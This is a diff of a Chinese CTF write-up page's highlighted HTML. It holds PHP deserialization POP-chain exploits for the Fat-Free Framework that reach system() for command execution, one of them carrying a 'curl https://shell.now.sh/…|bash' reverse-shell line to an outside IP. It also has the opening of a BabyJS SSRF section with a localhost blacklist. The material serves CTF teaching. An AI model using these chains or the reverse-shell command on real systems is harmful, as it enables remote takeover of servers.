+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$func</span> <span class="o">&amp;&amp;</span> <span class="nx">is_file</span><span class="p">(</span><span class="nv">$file</span><span class="o">=</span><span class="nv">$func</span><span class="p">(</span><span class="nv">$auto</span><span class="o">.</span><span class="nv">$class</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;.php&#39;</span><span class="p">)</span> <span class="o">||</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">is_file</span><span class="p">(</span><span class="nv">$file</span><span class="o">=</span><span class="nv">$auto</span><span class="o">.</span><span class="nv">$class</span><span class="o">.</span><span class="s1">&#39;.php&#39;</span><span class="p">)</span> <span class="o">||</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">is_file</span><span class="p">(</span><span class="nv">$file</span><span class="o">=</span><span class="nv">$auto</span><span class="o">.</span><span class="nx">strtolower</span><span class="p">(</span><span class="nv">$class</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;.php&#39;</span><span class="p">)</span> <span class="o">||</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">is_file</span><span class="p">(</span><span class="nv">$file</span><span class="o">=</span><span class="nx">strtolower</span><span class="p">(</span><span class="nv">$auto</span><span class="o">.</span><span class="nv">$class</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;.php&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">require</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>根据命名空间拆分成路径拼接php判断文件是否存在，所以我们需要使用<code>CLI\WS</code>加载ws.php文件。</p>
 <p>exp</p>
@@ -496,52 +496,52 @@
 </span><span class="lnt">45
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="k">namespace</span> <span class="nx">DB\SQL</span> <span class="p">{</span>
-	<span class="k">class</span> <span class="nc">Mapper</span> <span class="p">{</span>
-		<span class="k">protected</span> <span class="nv">$props</span><span class="p">;</span>
-
-		<span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$props</span><span class="p">)</span> <span class="p">{</span>
-			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">props</span> <span class="o">=</span> <span class="nv">$props</span><span class="p">;</span>
-		<span class="p">}</span>
-	<span class="p">}</span>
-<span class="p">}</span>
-
-<span class="k">namespace</span> <span class="nx">CLI</span> <span class="p">{</span>
-	<span class="k">class</span> <span class="nc">Agent</span> <span class="p">{</span>
-		<span class="k">protected</span> <span class="nv">$server</span><span class="p">,</span> <span class="nv">$socket</span><span class="p">;</span>
-
-	    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$server</span><span class="p">,</span> <span class="nv">$socket</span><span class="p">)</span> <span class="p">{</span>
-	        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">server</span> <span class="o">=</span> <span class="nv">$server</span><span class="p">;</span>
-	        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">socket</span> <span class="o">=</span> <span class="nv">$socket</span><span class="p">;</span>
-    	<span class="p">}</span>
-	<span class="p">}</span>
-	<span class="k">class</span> <span class="nc">WS</span> <span class="p">{</span>
-		<span class="k">protected</span> <span class="nv">$events</span><span class="p">;</span>
-
-		<span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$events</span><span class="p">)</span> <span class="p">{</span>
-			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">events</span> <span class="o">=</span> <span class="nv">$events</span><span class="p">;</span>
-		<span class="p">}</span>
-	<span class="p">}</span>
-<span class="p">}</span>
-
-<span class="k">namespace</span> <span class="p">{</span>
-	<span class="k">class</span> <span class="nc">Session</span> <span class="p">{</span>
-		<span class="k">public</span> <span class="nv">$events</span><span class="p">;</span>
-
-		<span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$events</span><span class="p">)</span> <span class="p">{</span>
-			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">events</span> <span class="o">=</span> <span class="nv">$events</span><span class="p">;</span>
-		<span class="p">}</span>
-	<span class="p">}</span>
-
-	<span class="nv">$mapper</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DB\SQL\Mapper</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;read&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;system&#39;</span><span class="p">));</span>
-	<span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">CLI\Agent</span><span class="p">(</span><span class="nv">$mapper</span><span class="p">,</span><span class="s1">&#39;cat /etc/flagzaizheli&#39;</span><span class="p">);</span>
-	<span class="nv">$t</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Session</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;disconnect&#39;</span><span class="o">=&gt;</span><span class="k">array</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span> <span class="s1">&#39;fetch&#39;</span><span class="p">)));</span>
-	<span class="nv">$agent</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">CLI\Agent</span><span class="p">(</span><span class="nv">$t</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
-	<span class="nv">$load</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">CLI\WS</span><span class="p">(</span><span class="nv">$agent</span><span class="p">);</span>
-	<span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$load</span><span class="p">));</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">DB\SQL</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">class</span> <span class="nc">Mapper</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">protected</span> <span class="nv">$props</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$props</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">props</span> <span class="o">=</span> <span class="nv">$props</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">CLI</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">class</span> <span class="nc">Agent</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">protected</span> <span class="nv">$server</span><span class="p">,</span> <span class="nv">$socket</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$server</span><span class="p">,</span> <span class="nv">$socket</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">server</span> <span class="o">=</span> <span class="nv">$server</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">socket</span> <span class="o">=</span> <span class="nv">$socket</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">class</span> <span class="nc">WS</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">protected</span> <span class="nv">$events</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$events</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">events</span> <span class="o">=</span> <span class="nv">$events</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">class</span> <span class="nc">Session</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">public</span> <span class="nv">$events</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$events</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">events</span> <span class="o">=</span> <span class="nv">$events</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nv">$mapper</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DB\SQL\Mapper</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;read&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;system&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">CLI\Agent</span><span class="p">(</span><span class="nv">$mapper</span><span class="p">,</span><span class="s1">&#39;cat /etc/flagzaizheli&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$t</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Session</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;disconnect&#39;</span><span class="o">=&gt;</span><span class="k">array</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span> <span class="s1">&#39;fetch&#39;</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$agent</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">CLI\Agent</span><span class="p">(</span><span class="nv">$t</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$load</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">CLI\WS</span><span class="p">(</span><span class="nv">$agent</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$load</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><h3 id="方法二官方"><a href="#方法二官方" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:方法二官方" class="headings">方法二(官方)</a></h3>
 <p>官方选择的<code>__call</code>函数触发点与上面不同，是从<code>DB\Mongo\Mapper</code>的insert函数触发，不过最终还是要通过<code>DB\SQL\Mapper</code>的<code>__call</code>方法实现任意命令执行。</p>
@@ -612,66 +612,66 @@
 </span><span class="lnt">59
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span> 
-<span class="k">namespace</span> <span class="nx">CLI</span><span class="p">{</span> 
-    <span class="k">class</span> <span class="nc">Agent</span> 
-    <span class="p">{</span> 
-        <span class="k">protected</span> <span class="nv">$server</span><span class="p">;</span> 
-        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$server</span><span class="p">)</span> 
-        <span class="p">{</span> 
-            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">server</span><span class="o">=</span><span class="nv">$server</span><span class="p">;</span> 
-        <span class="p">}</span> 
-    <span class="p">}</span> 
-
-    <span class="k">class</span> <span class="nc">WS</span> <span class="p">{</span> <span class="p">}</span> 
-<span class="p">}</span> 
-<span class="k">namespace</span> <span class="nx">DB</span><span class="p">{</span> 
-    <span class="k">abstract</span> <span class="k">class</span> <span class="nc">Cursor</span>  <span class="k">implements</span> <span class="nx">\IteratorAggregate</span> <span class="p">{}</span> 
-    <span class="k">class</span> <span class="nc">Mongo</span> <span class="p">{</span> 
-        <span class="k">public</span> <span class="nv">$events</span><span class="p">;</span> 
-        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$events</span><span class="p">)</span> 
-        <span class="p">{</span> 
-            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">events</span><span class="o">=</span><span class="nv">$events</span><span class="p">;</span> 
-        <span class="p">}</span> 
-    <span class="p">}</span> 
-<span class="p">}</span> 
-
-<span class="k">namespace</span> <span class="nx">DB\Mongo</span><span class="p">{</span> 
-    <span class="k">class</span> <span class="nc">Mapper</span> <span class="k">extends</span> <span class="nx">\DB\Cursor</span> <span class="p">{</span> 
-        <span class="k">protected</span> <span class="nv">$legacy</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> 
-        <span class="k">protected</span> <span class="nv">$collection</span><span class="p">;</span> 
-        <span class="k">protected</span> <span class="nv">$document</span><span class="p">;</span> 
-        <span class="k">function</span> <span class="nf">offsetExists</span><span class="p">(</span><span class="nv">$offset</span><span class="p">){}</span> 
-        <span class="k">function</span> <span class="nf">offsetGet</span><span class="p">(</span><span class="nv">$offset</span><span class="p">){}</span> 
-        <span class="k">function</span> <span class="nf">offsetSet</span><span class="p">(</span><span class="nv">$offset</span><span class="p">,</span> <span class="nv">$value</span><span class="p">){}</span> 
-        <span class="k">function</span> <span class="nf">offsetUnset</span><span class="p">(</span><span class="nv">$offset</span><span class="p">){}</span> 
-        <span class="k">function</span> <span class="nf">getIterator</span><span class="p">(){}</span>     
-        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$collection</span><span class="p">,</span><span class="nv">$document</span><span class="p">){</span> 
-            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">collection</span><span class="o">=</span><span class="nv">$collection</span><span class="p">;</span> 
-            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">document</span><span class="o">=</span><span class="nv">$document</span><span class="p">;</span> 
-        <span class="p">}</span> 
-    <span class="p">}</span> 
-<span class="p">}</span> 
-<span class="k">namespace</span> <span class="nx">DB\SQL</span><span class="p">{</span> 
-    <span class="k">class</span> <span class="nc">Mapper</span> <span class="k">extends</span> <span class="nx">\DB\Cursor</span><span class="p">{</span> 
-        <span class="k">protected</span> <span class="nv">$props</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;insertone&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;system&#34;</span><span class="p">];</span> 
-        <span class="k">function</span> <span class="nf">offsetExists</span><span class="p">(</span><span class="nv">$offset</span><span class="p">){}</span> 
-        <span class="k">function</span> <span class="nf">offsetGet</span><span class="p">(</span><span class="nv">$offset</span><span class="p">){}</span> 
-        <span class="k">function</span> <span class="nf">offsetSet</span><span class="p">(</span><span class="nv">$offset</span><span class="p">,</span> <span class="nv">$value</span><span class="p">){}</span> 
-        <span class="k">function</span> <span class="nf">offsetUnset</span><span class="p">(</span><span class="nv">$offset</span><span class="p">){}</span> 
-        <span class="k">function</span> <span class="nf">getIterator</span><span class="p">(){}</span> 
-    <span class="p">}</span> 
-<span class="p">}</span> 
-
-<span class="k">namespace</span><span class="p">{</span> 
-    <span class="nv">$SQLMapper</span><span class="o">=</span><span class="k">new</span> <span class="nx">DB\SQL\Mapper</span><span class="p">();</span> 
-    <span class="nv">$MongoMapper</span><span class="o">=</span><span class="k">new</span> <span class="nx">DB\Mongo\Mapper</span><span class="p">(</span><span class="nv">$SQLMapper</span><span class="p">,</span><span class="s2">&#34;curl https://shell.now.sh/39.106.207.66:2333 |bash&#34;</span><span class="p">);</span> 
-    <span class="nv">$DBMongo</span><span class="o">=</span><span class="k">new</span> <span class="nx">DB\Mongo</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;disconnect&#39;</span><span class="o">=&gt;</span><span class="k">array</span><span class="p">(</span><span class="nv">$MongoMapper</span><span class="p">,</span><span class="s2">&#34;insert&#34;</span><span class="p">)));</span> 
-    <span class="nv">$Agent</span><span class="o">=</span><span class="k">new</span> <span class="nx">CLI\Agent</span><span class="p">(</span><span class="nv">$DBMongo</span><span class="p">);</span> 
-    <span class="nv">$WS</span><span class="o">=</span><span class="k">new</span> <span class="nx">CLI\WS</span><span class="p">();</span> 
-    <span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="nv">$WS</span><span class="p">,</span><span class="nv">$Agent</span><span class="p">)));</span>
-<span class="p">}</span> 
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">CLI</span><span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">Agent</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">        <span class="k">protected</span> <span class="nv">$server</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$server</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">        <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">server</span><span class="o">=</span><span class="nv">$server</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">WS</span> <span class="p">{</span> <span class="p">}</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span> 
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">DB</span><span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">abstract</span> <span class="k">class</span> <span class="nc">Cursor</span>  <span class="k">implements</span> <span class="nx">\IteratorAggregate</span> <span class="p">{}</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">Mongo</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$events</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$events</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">        <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">events</span><span class="o">=</span><span class="nv">$events</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">DB\Mongo</span><span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">Mapper</span> <span class="k">extends</span> <span class="nx">\DB\Cursor</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">        <span class="k">protected</span> <span class="nv">$legacy</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">        <span class="k">protected</span> <span class="nv">$collection</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">        <span class="k">protected</span> <span class="nv">$document</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">        <span class="k">function</span> <span class="nf">offsetExists</span><span class="p">(</span><span class="nv">$offset</span><span class="p">){}</span> 
+</span></span><span class="line"><span class="cl">        <span class="k">function</span> <span class="nf">offsetGet</span><span class="p">(</span><span class="nv">$offset</span><span class="p">){}</span> 
+</span></span><span class="line"><span class="cl">        <span class="k">function</span> <span class="nf">offsetSet</span><span class="p">(</span><span class="nv">$offset</span><span class="p">,</span> <span class="nv">$value</span><span class="p">){}</span> 
+</span></span><span class="line"><span class="cl">        <span class="k">function</span> <span class="nf">offsetUnset</span><span class="p">(</span><span class="nv">$offset</span><span class="p">){}</span> 
+</span></span><span class="line"><span class="cl">        <span class="k">function</span> <span class="nf">getIterator</span><span class="p">(){}</span>     
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$collection</span><span class="p">,</span><span class="nv">$document</span><span class="p">){</span> 
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">collection</span><span class="o">=</span><span class="nv">$collection</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">document</span><span class="o">=</span><span class="nv">$document</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span> 
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nx">DB\SQL</span><span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">Mapper</span> <span class="k">extends</span> <span class="nx">\DB\Cursor</span><span class="p">{</span> 
+</span></span><span class="line"><span class="cl">        <span class="k">protected</span> <span class="nv">$props</span><span class="o">=</span><span class="p">[</span><span class="s2">&#34;insertone&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;system&#34;</span><span class="p">];</span> 
+</span></span><span class="line"><span class="cl">        <span class="k">function</span> <span class="nf">offsetExists</span><span class="p">(</span><span class="nv">$offset</span><span class="p">){}</span> 
+</span></span><span class="line"><span class="cl">        <span class="k">function</span> <span class="nf">offsetGet</span><span class="p">(</span><span class="nv">$offset</span><span class="p">){}</span> 
+</span></span><span class="line"><span class="cl">        <span class="k">function</span> <span class="nf">offsetSet</span><span class="p">(</span><span class="nv">$offset</span><span class="p">,</span> <span class="nv">$value</span><span class="p">){}</span> 
+</span></span><span class="line"><span class="cl">        <span class="k">function</span> <span class="nf">offsetUnset</span><span class="p">(</span><span class="nv">$offset</span><span class="p">){}</span> 
+</span></span><span class="line"><span class="cl">        <span class="k">function</span> <span class="nf">getIterator</span><span class="p">(){}</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span><span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="nv">$SQLMapper</span><span class="o">=</span><span class="k">new</span> <span class="nx">DB\SQL\Mapper</span><span class="p">();</span> 
+</span></span><span class="line"><span class="cl">    <span class="nv">$MongoMapper</span><span class="o">=</span><span class="k">new</span> <span class="nx">DB\Mongo\Mapper</span><span class="p">(</span><span class="nv">$SQLMapper</span><span class="p">,</span><span class="s2">&#34;curl https://shell.now.sh/39.106.207.66:2333 |bash&#34;</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">    <span class="nv">$DBMongo</span><span class="o">=</span><span class="k">new</span> <span class="nx">DB\Mongo</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;disconnect&#39;</span><span class="o">=&gt;</span><span class="k">array</span><span class="p">(</span><span class="nv">$MongoMapper</span><span class="p">,</span><span class="s2">&#34;insert&#34;</span><span class="p">)));</span> 
+</span></span><span class="line"><span class="cl">    <span class="nv">$Agent</span><span class="o">=</span><span class="k">new</span> <span class="nx">CLI\Agent</span><span class="p">(</span><span class="nv">$DBMongo</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">    <span class="nv">$WS</span><span class="o">=</span><span class="k">new</span> <span class="nx">CLI\WS</span><span class="p">();</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="nv">$WS</span><span class="p">,</span><span class="nv">$Agent</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> 
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><h2 id="网鼎杯-2020-半决赛babyjs"><a href="#网鼎杯-2020-半决赛babyjs" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:网鼎杯-2020-半决赛babyjs" class="headings">[网鼎杯 2020 半决赛]BabyJS</a></h2>
 <blockquote>
@@ -717,40 +717,40 @@
 </span><span class="lnt">33
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="kd">var</span> <span class="nx">blacklist</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;127.0.0.1.xip.io&#39;</span><span class="p">,</span><span class="s1">&#39;::ffff:127.0.0.1&#39;</span><span class="p">,</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span><span class="s1">&#39;0&#39;</span><span class="p">,</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span><span class="s1">&#39;[::1]&#39;</span><span class="p">,</span><span class="s1">&#39;::1&#39;</span><span class="p">];</span>
-<span class="p">...</span>
-<span class="nx">router</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/debug&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="p">{</span>
